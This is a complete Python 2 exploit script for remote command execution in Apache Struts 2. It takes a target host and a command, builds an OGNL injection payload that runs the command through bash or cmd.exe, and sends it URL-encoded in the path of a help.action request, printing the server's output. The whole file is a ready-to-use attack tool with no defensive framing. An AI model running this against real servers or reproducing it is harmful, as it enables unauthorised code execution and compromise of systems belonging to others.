#!/usr/bin/python
# -*- coding: utf-8 -*-

# hook-s3c (github.com/hook-s3c), @hook_s3c on twitter

import sys
import urllib
import urllib2
import httplib


def exploit(host,cmd):
    print "[Execute]: {}".format(cmd)

    ognl_payload = "${"
    ognl_payload += "(#_memberAccess['allowStaticMethodAccess']=true)."
    ognl_payload += "(#cmd='{}').".format(cmd)
    ognl_payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    ognl_payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd}))."
    ognl_payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    ognl_payload += "(#p.redirectErrorStream(true))."
    ognl_payload += "(#process=#p.start())."
    ognl_payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    ognl_payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    ognl_payload += "(#ros.flush())"
    ognl_payload += "}"

    if not ":" in host:
        host = "{}:8080".format(host)

    # encode the payload
    ognl_payload_encoded = urllib.quote_plus(ognl_payload)

    # further encoding
    url = "http://{}/{}/help.action".format(host, ognl_payload_encoded.replace("+","%20").replace(" ", "%20").replace("%2F","/"))

    print "[Url]: {}\n\n\n".format(url)

    try:
        request = urllib2.Request(url)
        response = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        response = e.partial
    print response


if len(sys.argv) < 3:
    sys.exit('Usage: %s <host:port> <cmd>' % sys.argv[0])
else:
    exploit(sys.argv[1],sys.argv[2])
